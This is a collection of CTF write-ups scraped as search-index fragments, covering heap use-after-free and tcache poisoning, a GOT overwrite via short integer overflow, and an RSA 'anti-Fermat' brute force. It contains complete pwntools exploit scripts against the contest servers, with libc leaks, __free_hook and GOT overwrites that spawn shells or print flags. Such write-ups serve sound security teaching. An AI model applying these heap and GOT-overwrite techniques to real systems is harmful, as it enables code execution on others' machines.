2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":" I tried to spend my saturday to do the NahamCon CTF 2022, but I had a lot of events during the day, so I plan to look at 3-5 problems. At the end, I could only solve one problem that I looked first, because it turns out to be pretty hard for me. I’m still new to this, so I would like to apologize in advance if there is wrong or misleading information stated in here. Feel free to contact me if you find mistakes in my writeup. Cheers 🍻 Pwn ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:0:0","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Free Real Estate ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:0","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Intro We were given two files, the Dockerfile and a binary called free_real_estate. Let’s try to run the binary first. ./free_real_estate Enter your name: lmao Hello: lmao! [1] Show property [2] Add property [3] Remove property [4] Edit property [5] Change name [6] Exit \u003e Seems like we will be working with heap (Well, the name of the challenge is free though) ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:1","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Initial Analysis Let’s grab the libc file first by turning up the docker based on the given Dockerfile. Checking on the libc file, the glibc is glibc-2.31, which mean we couldn’t do double free. Checksec of the binary: Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Now, turning up our decompiler, let’s try to decompile it and breakdown some important functions. main undefined8 main(void) { bool bVar1; char *pcVar2; undefined4 uVar3; size_t sVar4; bVar1 = false; setbuf(stdin,(char *)0x0); setbuf(stdout,(char *)0x0); printf(\"Enter your name: \"); username._8_8_ = getline((char **)username,(size_t *)(username + 8),stdin); pcVar2 = username._0_8_; sVar4 = strcspn(username._0_8_,\"\\n\"); pcVar2[sVar4] = '\\0'; username._8_8_ = username._8_8_ + -1; printf(\"Hello: %s!\\n\\n\",username._0_8_); while (!bVar1) { uVar3 = menu(); switch(uVar3) { case 0: if (property == 0) { puts(\"You do not own any property.\"); } else { show_property(); } break; case 1: if (property == 0) { add_property(); } else { puts(\"You already own property.\"); } break; case 2: if (property == 0) { puts(\"You do not own any property.\"); } else { remove_property(); } break; case 3: if (property == 0) { puts(\"You do not own any property.\"); } else { edit_property(); } break; case 4: change_name(); break; default: bVar1 = true; } puts(\"\"); } return 0; } Okay, so we have like 5 functions that we can use, and we can only add property only after removing it. add_property void add_property(void) { long lVar1; void *pvVar2; size_t sVar3; long in_FS_OFFSET; char local_21; long local_20; void *_property; local_20 = *(long *)(in_FS_OFFSET + 0x28); local_21 = '\\0'; property = malloc(0x40); if (property == (void *)0x0) { puts(\"Failed to allocate memory for the property\"); /* WARNING: Subroutine does not return */ exit(1); } printf(\"Enter the house number: \"); __isoc99_scanf(\u0026fmt_d,(long)property + 0x18); getchar(); printf(\"What is the length of the street name: \"); __isoc99_scanf(\u0026fmt_zu); getchar(); _property = property; pvVar2 = malloc(*(long *)((long)property + 0x28) + 1); *(void **)((long)_property + 0x20) = pvVar2; if (*(long *)((long)property + 0x20) == 0) { puts(\"Failed to allocate memory for the street name\"); /* WARNING: Subroutine does not return */ exit(1); } printf(\"Enter the street name: \"); fgets(*(char **)((long)property + 0x20),(int)*(undefined8 *)((long)property + 0x28),stdin); lVar1 = *(long *)((long)property + 0x20); sVar3 = strcspn(*(char **)((long)property + 0x20),\"\\n\"); *(undefined *)(sVar3 + lVar1) = 0; printf(\"What is the price of the property?: \"); __isoc99_scanf(\u0026fmt_lf,(long)property + 0x10); getchar(); printf(\"Would you like to add a comment for this property? [y/n]: \"); __isoc99_scanf(\u0026DAT_00102133,\u0026local_21); getchar(); if (local_21 == 'y') { printf(\"What is the length of the comment?: \"); __isoc99_scanf(\u0026fmt_zu); getchar(); _property = property; pvVar2 = malloc(*(long *)((long)property + 0x38) + 1); *(void **)((long)_property + 0x30) = pvVar2; if (*(long *)((long)property + 0x30) == 0) { puts(\"Failed to allocate memory for the comment\"); /* WARNING: Subroutine does not return */ exit(1); } printf(\"Enter the comment: \"); fgets(*(char **)((long)property + 0x30),(int)*(undefined8 *)((long)property + 0x38),stdin); lVar1 = *(long *)((long)property + 0x30); sVar3 = strcspn(*(char **)((long)property + 0x30),\"\\n\"); *(undefined *)(sVar3 + lVar1) = 0; } if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } Okay, so when we add a new property, important things that we do: malloc(0x40) for property object We can malloc street name with any size And we store the given size inside the property object We can malloc comment with any size And we store the given size inside the property object edit_property void edit_property(void) { void *pvVar1; size_t sVar2; long in_FS_OFFSET; char local_29; ulong input_size; long local_20; long _property; local_20 = *(long *","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:2","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Okay, so important points that we can conclude from our initial analysis: We can malloc chunk with any size Hence, we can freed a chunk to unsorted bin by malloc large chunk There is Use-After-Free (UAF) bug on the comment, where we can see the freed chunk, and edit it via edit_property Seems like the rough plan is pretty clear. We can leak libc address by leveraging the UAF bug in the comment objectt. And then we need to be able to overwrite __free_hook by system to trigger a shell. ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:3","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Solution Okay, so now I will explain my solution on this challenge. Let’s define helper in our script first to help our life easier. def add_property(r, lsn, sn, lc, comment=''): r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'Enter the house number: ', str(10).encode()) # Isn't useful. Just set any value. r.sendlineafter(b'What is the length of the street name: ', str(lsn).encode()) r.sendlineafter(b'Enter the street name: ', sn) r.sendlineafter(b'What is the price of the property?: ', str(10).encode()) # Isn't useful. Just set any value. if lc == 0: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) def edit_property(r, lsn, sn, lc, comment='', change_comment=False, is_free_hook_overwritted=False): r.sendlineafter(b'\u003e ', b'4') r.sendlineafter(b'Would you like to change the house number? [y/n]: ', b'n') # Isn't useful. No need to edit. if lsn == 0: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'y') r.sendlineafter(b'Enter the new street name length: ', str(lsn).encode()) r.sendlineafter(b'Enter the new street name: ', sn) r.sendlineafter(b'Would you like to change the price of the property? [y/n]: ', b'n') # Isn't useful. No need to edit. if lc == 0: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'n') else: if not change_comment: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) else: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'y') r.sendlineafter(b'Enter the new comment length: ', str(lc).encode()) if is_free_hook_overwritted: # No need to enter new comment, as we have overwritten it with system return r.sendlineafter(b'Enter the new comment: ', comment) def remove_property(r): r.sendlineafter(b'\u003e ', b'3') def show_property(r): r.sendlineafter(b'\u003e ', b'1') r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() comment = r.recvline().strip().split(b': ')[1] # We only care the comment value return comment def change_username(r, ln, name): r.sendlineafter(b'\u003e ', b'5') r.sendlineafter(b'What is the length of your new name?: ', str(ln).encode()) r.sendlineafter(b'Enter your new name: ', name) Part 1: Leak Libc Address Okay, so now let’s try to fire up our GDB to have a better visualization on the heap. Let’s start the program by initializing our name r = conn() # After first connection, by default the binary will call malloc(0x40) # and use this heap chunk for property variable r.sendlineafter(b'Enter your name: ', p64(0xdeadbeef)) Below is the heap after we initialize our name 0x55802d04d290 0x0000000000000000 0x0000000000000081 ................ 0x55802d04d2a0 0x00000000deadbeef 0x000000000000000a ................ 0x55802d04d2b0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2c0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2d0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2e0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2f0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d300 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d310 0x0000000000000000 0x0000000000020cf1 ................ \u003c-- Top chunk Now, we need to free a chunk to unsorted bin. Simply malloc a large chunk and free it. add_property(r, 0x10, b'lmao', 0x427, b'lmao') edit_property(r, 0x20, b'lmao', 0) remove_property(r) What we want to achieve on here is: Create a large chunk in comment Alloc a new chunk below it to prevent consolidation Freed all the object After freed","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:4","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Final script from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./free_real_estate\") libc = ELF(\"./libc-2.31.so\") ld = ELF(\"./ld-2.31.so\") main_arena = 0x1ecb80 context.binary = exe def conn(): print(args) if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r) else: r = remote(\"challenge.nahamcon.com\", 32491) return r def add_property(r, lsn, sn, lc, comment=''): r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'Enter the house number: ', str(10).encode()) # Isn't useful. Just set any value. r.sendlineafter(b'What is the length of the street name: ', str(lsn).encode()) r.sendlineafter(b'Enter the street name: ', sn) r.sendlineafter(b'What is the price of the property?: ', str(10).encode()) # Isn't useful. Just set any value. if lc == 0: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) def edit_property(r, lsn, sn, lc, comment='', change_comment=False, is_free_hook_overwritted=False): r.sendlineafter(b'\u003e ', b'4') r.sendlineafter(b'Would you like to change the house number? [y/n]: ', b'n') # Isn't useful. No need to edit. if lsn == 0: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'y') r.sendlineafter(b'Enter the new street name length: ', str(lsn).encode()) r.sendlineafter(b'Enter the new street name: ', sn) r.sendlineafter(b'Would you like to change the price of the property? [y/n]: ', b'n') # Isn't useful. No need to edit. if lc == 0: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'n') else: if not change_comment: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) else: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'y') r.sendlineafter(b'Enter the new comment length: ', str(lc).encode()) if is_free_hook_overwritted: # No need to enter new comment, as we have overwritten it with system return r.sendlineafter(b'Enter the new comment: ', comment) def remove_property(r): r.sendlineafter(b'\u003e ', b'3') def show_property(r): r.sendlineafter(b'\u003e ', b'1') r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() comment = r.recvline().strip().split(b': ')[1] # We only care the comment value return comment def change_username(r, ln, name): r.sendlineafter(b'\u003e ', b'5') r.sendlineafter(b'What is the length of your new name?: ', str(ln).encode()) r.sendlineafter(b'Enter your new name: ', name) r = conn() # After first connection, by default the binary will call malloc(0x40) # and use this heap chunk for property variable r.sendlineafter(b'Enter your name: ', p64(0xdeadbeef)) ''' Part 1: Leak Libc base address ''' # Create big chunk for Comment # Chunk-1: Street name # Chunk-2: Comment add_property(r, 0x10, b'lmao', 0x427, b'lmao') # Prevent consolidate # Chunk-1 got freed -\u003e tcache # Chunk-3: Street name edit_property(r, 0x20, b'lmao', 0) # Free all # Chunk-2 got freed -\u003e unsorted_bin due to its large size # Chunk-3 got freed -\u003e Tcache remove_property(r) # Due to bug on remove_property, even though we create a new property without comment, # the property's comment still point to the freed chunk, hence we can leak libc address # via show_property due to the fact that unsorted_bin point to libc main_arena + 0x60. # Create new property without comment \u0026 show its property add_property(r, 0x10, b'lmao', 0) leaked_libc = u64(show_property(r).ljust(8, b'\\x00')) log.info(f'leaked_libc: {hex(leaked_libc)}') libc_base = leaked_libc - ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:5","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Social Media Follow me on twitter ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:2:0","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"For this CTF, I managed to solve two challenges only. I hope I can do better in the next CTF. Pwn ","date":"Mar 11, 2022","objectID":"/posts/zer0pts-ctf-2022/:0:0","tags":["Writeup","zer0pts","pwn","short-overflow","got-overwrite","RSA","Fermat","crypto","2022"],"title":"zer0pts CTF 2022","uri":"/posts/zer0pts-ctf-2022/"},{"categories":null,"content":"Modern-Rome We were given a binary compiled from cpp file. Below is the cpp file. #include \u003cstring\u003e #include \u003ciostream\u003e short buf[10]; void win() { std::system(\"/bin/sh\"); } short readroman(){ short res = 0; std::string s; std::cin \u003e\u003e s; auto it = s.crbegin(); int b = 1; for (auto c: \"IXCM\") { int cnt = 0; while (cnt \u003c 9 \u0026\u0026 it != s.crend() \u0026\u0026 *it == c) { it++; cnt++; } res += b * cnt; b *= 10; } return res; } int main() { std::setbuf(stdin, NULL); std::setbuf(stdout, NULL); std::cout \u003c\u003c \"ind: \"; int ind = readroman(); std::cout \u003c\u003c \"val: \"; int val = readroman(); std::cout \u003c\u003c \"buf[\" \u003c\u003c ind \u003c\u003c \"] = \" \u003c\u003c val \u003c\u003c std::endl; buf[ind] = val; std::exit(0); } Checksec result Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) From the given file, some notes that we can take: No PIE, so we don’t need to look for the base address of the binary. There is win function, which clearly our goal is to call this function. buf is array of short (2 bytes), which is located in the .data segment (precisely at 0x404340). The program is receiving a roman number, which will convert it to integer. We can set buf[index] = value, where we control the index and value. There isn’t boundary check for the index At a glance, seems like there isn’t anything wrong with the code. But there is a subtle bug on there. See the roman conversion method below: short readroman(){ short res = 0; std::string s; std::cin \u003e\u003e s; auto it = s.crbegin(); int b = 1; for (auto c: \"IXCM\") { int cnt = 0; while (cnt \u003c 9 \u0026\u0026 it != s.crend() \u0026\u0026 *it == c) { it++; cnt++; } res += b * cnt; b *= 10; } return res; } The first idea is of course to overflow the res variable. In order to do that, we need to be able to send Roman value larger than $32767$. However, it seems like impossible to do that, because seems like the maximum value that can be returned by the readroman function is $9999$. In C, string is ended with \\0, which mean during iterating string “IXCM” with auto, \\0 will be iterated also, henc the maximum value that can be returned by the method is not $9999$, but $99999$, which is enough to overflow the res variable. My solution is to overwrite the GOT value of exit by win address. The exit GOT location is at 0x404058, which mean to overwrite it, we will need to assign the win address value to buf[(0x404340 - 0x404058) // 2] (Need to divide it by $2$ because buf is array of short type element). Also another note is that, we only need to overwrite the last two-bytes of the exit GOT value (because the third lsb is already the same, which is 0x40) Below is the solver: from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") offset = b'\\x00'*6+b'M'*5+b'C'*1+b'X'*6+b'I'*4 win = b'M'*4+b'C'*8+b'X'*5+b'I'*4 r = remote('pwn1.ctf.zer0pts.com', 9000) r.sendlineafter(b'ind: ', offset) r.sendlineafter(b'val: ', win) r.interactive() Flag: zer0pts{R0me_w1ll_3x1st_a5_1on9_4s_th3_Col1s3um_d0es} Crypto ","date":"Mar 11, 2022","objectID":"/posts/zer0pts-ctf-2022/:1:0","tags":["Writeup","zer0pts","pwn","short-overflow","got-overwrite","RSA","Fermat","crypto","2022"],"title":"zer0pts CTF 2022","uri":"/posts/zer0pts-ctf-2022/"},{"categories":null,"content":"Anti-Fermat Below is the source code of the chall: from Crypto.Util.number import isPrime, getStrongPrime from gmpy import next_prime from secret import flag # Anti-Fermat Key Generation p = getStrongPrime(1024) q = next_prime(p ^ ((1\u003c\u003c1024)-1)) n = p * q e = 65537 # Encryption m = int.from_bytes(flag, 'big') assert m \u003c n c = pow(m, e, n) print('n = {}'.format(hex(n))) print('c = {}'.format(hex(c))) Through observations, we can see that $p+q$ value is actually bruteforce-able. If we see on how $q$ is generated, $q$ is basically we flip $p$ bits and increase it until it is a prime. So, $$ p + q = (1 « 1024) + x $$ where $x$ is small. Notes that we can get the $\\varphi(n)$ value if we know $p+q$. See below equation: $$ \\begin{align} \\varphi(n) \u0026= (p-1)*(q-1)\\\\ \u0026= pq - (p+q) + 1\\\\ \\end{align} $$ To solve this chall, we just need to bruteforce $p+q$ based on first equation, and then try to decrypt the $c$ with the calculated $\\varphi(n)$. Below is my solver (I use sagemath). from Crypto.Util.number import * e = 65537 n = 0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751 c = 0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62 base = 1\u003c\u003c1024 # Bruteforce p+q value for i in range(0, 10000000, 1): print(f'Curr x: {i}') phi = n - (base+i) + 1 d = inverse_mod(e, phi) flag = long_to_bytes(int(pow(c, d, n))) if b'pts' in flag: print(f'Flag: {flag.decode()}') exit() Flag: zer0pts{F3rm4t,y0ur_m3th0d_n0_l0ng3r_w0rks.y0u_4r3_f1r3d} ","date":"Mar 11, 2022","objectID":"/posts/zer0pts-ctf-2022/:2:0","tags":["Writeup","zer0pts","pwn","short-overflow","got-overwrite","RSA","Fermat","crypto","2022"],"title":"zer0pts CTF 2022","uri":"/posts/zer0pts-ctf-2022/"},{"categories":null,"content":" I spend my Sunday doing Pragyan CTF 2022. I’m very grateful that I got 17th place even though I play it solo. Below is my writeup for challenges that I solved and don’t forget to follow me on Twitter 🙂 Pwn ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:0:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Database ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Intro We were given a binary, let’s decompile it. Below is the main function. void main(void) { ulong uVar1; long in_FS_OFFSET; char local_18 [8]; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); fflush(stdin); welcome(); fprintf(stderr,\"This might help: %p\\n\",main); do { menu(); read(0,local_18,8); uVar1 = atoll(local_18); switch(uVar1 \u0026 0xffffffff) { default: fwrite(\"Invalid choice\\n\",1,0xf,stderr); break; case 1: print_items(); break; case 2: insert_item(); break; case 3: update_item(); break; case 4: delete_item(); break; case 5: leave(); /* WARNING: Subroutine does not return */ exit(0); } fflush(stdin); } while( true ); } insert_item void insert_item(void) { size_t __size; void *pvVar1; ssize_t sVar2; long in_FS_OFFSET; int local_3c; char local_28 [24]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (len \u003c 0x10) { fwrite(\"Please enter the length of string =\u003e \",1,0x25,stderr); read(0,local_28,0xc); __size = atoll(local_28); if (__size == 0) { fwrite(\"Invalid length!\\n\",1,0x10,stderr); } else { for (local_3c = 0; local_3c \u003c 0x10; local_3c = local_3c + 1) { if (*(long *)(data_base + (long)local_3c * 0x10 + 8) == 0) { *(size_t *)(data_base + (long)local_3c * 0x10) = __size; pvVar1 = malloc(__size); *(void **)(data_base + (long)local_3c * 0x10 + 8) = pvVar1; fwrite(\"Please enter the string you want to save =\u003e \",1,0x2c,stderr); sVar2 = read(0,*(void **)(data_base + (long)local_3c * 0x10 + 8),__size); *(undefined *)(sVar2 + *(long *)(data_base + (long)local_3c * 0x10 + 8)) = 0; len = len + 1; break; } } } } else { fwrite(\"Database is full!\\n\",1,0x12,stderr); } if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } delete_item void delete_item(void) { int iVar1; long in_FS_OFFSET; char local_18 [8]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (len == 0) { fwrite(\"Database is empty\\n\",1,0x12,stderr); } else { fwrite(\"Please enter the index of element =\u003e \",1,0x25,stderr); read(0,local_18,8); iVar1 = atoi(local_18); if (*(long *)(data_base + (long)iVar1 * 0x10 + 8) == 0) { fwrite(\"Invalid index\\n\",1,0xe,stderr); } else { free(*(void **)(data_base + (long)iVar1 * 0x10 + 8)); *(undefined8 *)(data_base + (long)iVar1 * 0x10 + 8) = 0; *(undefined8 *)(data_base + (long)iVar1 * 0x10) = 0; fwrite(\"Element deleted successfully!\\n\",1,0x1e,stderr); len = len + -1; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } update_item void update_item(void) { int iVar1; uint uVar2; ssize_t sVar3; long in_FS_OFFSET; char local_30 [8]; char local_28 [24]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (len == 0) { fwrite(\"Database is empty!\\n\",1,0x13,stderr); } else { fwrite(\"Please enter the index of element =\u003e \",1,0x25,stderr); read(0,local_30,8); iVar1 = atoi(local_30); if (*(long *)(data_base + (long)iVar1 * 0x10 + 8) == 0) { fwrite(\"Invalid index\\n\",1,0xe,stderr); } else { fwrite(\"Please enter the length of string =\u003e \",1,0x25,stderr); read(0,local_28,8); uVar2 = atoi(local_28); *(ulong *)(data_base + (long)iVar1 * 0x10) = (ulong)uVar2; fwrite(\"Please enter the string =\u003e \",1,0x1b,stderr); sVar3 = read(0,*(void **)(data_base + (long)iVar1 * 0x10 + 8),(ulong)uVar2); *(undefined *)((long)(int)sVar3 + *(long *)(data_base + (long)iVar1 * 0x10 + 8)) = 0; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } leave void leave(void) { puts(\"Thanks a lot!\\nGoodbye!\"); return; } There is also secret function which will print the flag void secret(void) { system(\"/bin/cat ./flag\"); return; } Let’s checksec the binary: Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Okay, PIE is enabled ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Analysis main // At main function fprintf(stderr,\"This might help: %p\\n\",main); Reading through the code, I notice that the binary leak us the main address, which mean the PIE mitigation isn’t matter at all. We can calculate the address of available functions, plt, got, etc. insert_item Observation on the insert_item method, we can control the malloc chunk size. delete_item Observation on the delete_item method, the pointer was nulled after free, so we couldn’t do UAF or Double Free. update_item fwrite(\"Please enter the length of string =\u003e \",1,0x25,stderr); read(0,local_28,8); uVar2 = atoi(local_28); *(ulong *)(data_base + (long)iVar1 * 0x10) = (ulong)uVar2; fwrite(\"Please enter the string =\u003e \",1,0x1b,stderr); sVar3 = read(0,*(void **)(data_base + (long)iVar1 * 0x10 + 8),(ulong)uVar2); *(undefined *)((long)(int)sVar3 + *(long *)(data_base + (long)iVar1 * 0x10 + 8)) = 0; Observation on the update_item method, we can see that there is heap-overflow. Notice that there isn’t any check on the item’s size during update. If we put larger size during update than the allocated chunk size, we can overwrite the other chunks value. For example, let say that we insert_item three times with size 0x10. The chunk will be like below. ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x6161616161616161 0x0a61616161616161 aaaaaaaaaaaaaaa. 0x5555556022b0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022c0 0x6262626262626262 0x0a62626262626262 bbbbbbbbbbbbbbb. 0x5555556022d0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022e0 0x6363636363636363 0x0a63636363636363 ccccccccccccccc. What if we set bigger size during update_item? Then we can overwrite the other chunks which located next to each other. What happen if we free the chunks? It will be put to tcache bins, and then it will maintained a linked-list of the cache. Let say that we free the second and third chunk, the heap will be like below. ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x6161616161616161 0x0a61616161616161 aaaaaaaaaaaaaaa. 0x5555556022b0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022c0 0x00005555556022e0 0x0000555555602010 .\"`UUU... `UUU.. \u003c-- tcachebins[0x20][0/2] 0x5555556022d0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022e0 0x0000000000000000 0x0000555555602010 ......... `UUU.. \u003c-- tcachebins[0x20][1/2] ... To give a better visualization, below is the current state of the tcache linked_list Total items: 2 0x5555556022c0(head)-\u003e0x00005555556022e0-\u003eNULL As you can see on address 0x5555556022c0, the tcache stored a pointer to the next cache, so that when we do malloc(0x10), tcache will remove its curent head and move the head to its next pointer Before Total items: 2 0x5555556022c0(head)-\u003e0x00005555556022e0-\u003eNULL After malloc(0x10) 0x5555556022c0 address will be used as the new malloc chunk address Total items: 1 0x00005555556022e0(head)-\u003eNULL What happen if we use the heap-overflow to overwrite the tcache pointer? For example, imagine that the current heap chunk is like below ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x6161616161616161 0x0a61616161616161 aaaaaaaaaaaaaaa. 0x5555556022b0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022c0 0x00005555556022e0 0x0000555555602010 .\"`UUU... `UUU.. \u003c-- tcachebins[0x20][0/2] 0x5555556022d0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022e0 0x0000000000000000 0x0000555555602010 ......... `UUU.. \u003c-- tcachebins[0x20][1/2] ... Tcache bins: Total items: 2 0x5555556022c0(head)-\u003e0x00005555556022e0-\u003eNULL With update_item, let say we want to read 0x28 string, and we input 0x6161616161616161+0x6161616161616161+0x0000000000000000+0x0000000000000021+0xdeadbeefdeadbabe The chunk after that update will be like below: ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x61","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:2","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Solution My idea is to overwrite the puts GOT value to secret address with the heap-overflow bug, so that when we call leave, the puts will print the flag. To achieve that, my plan is: Create three items with size 0x10 via insert_item Free the second and third element via delete_item Heap overflow via update_item on the first item, with goals to replace the tcache next pointer to puts GOT address Create one item with size 0x10 via insert_item. Create one more item with size 0x10 and the stored string is the secret address via insert_item. This item will be stored at puts GOT address, and because the string is secret address, now, whenever the binary call puts, it will be resolved to secret instead. Call leave and it will print the flag. Below is the solver: from pwn import * from pwn import p64, u64 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") ''' +-----------------------------+ | 1. Show all data | | 2. Insert a element | | 3. Update a element | | 4. Remove a element | | 5. Exit | +-----------------------------+ ''' def insert_item(r, length, data): r.sendlineafter(b'choice =\u003e ', str(2).encode()) r.sendlineafter(b'of string =\u003e ', str(length).encode()) r.sendafter(b'to save =\u003e ', data) def update_item(r, index, length, data): r.sendlineafter(b'choice =\u003e ', str(3).encode()) r.sendlineafter(b'of element =\u003e ', str(index).encode()) r.sendlineafter(b'of string =\u003e ', str(length).encode()) r.sendafter(b'string =\u003e ', data) def delete_item(r, index): r.sendlineafter(b'choice =\u003e ', str(4).encode()) r.sendlineafter(b'index of element 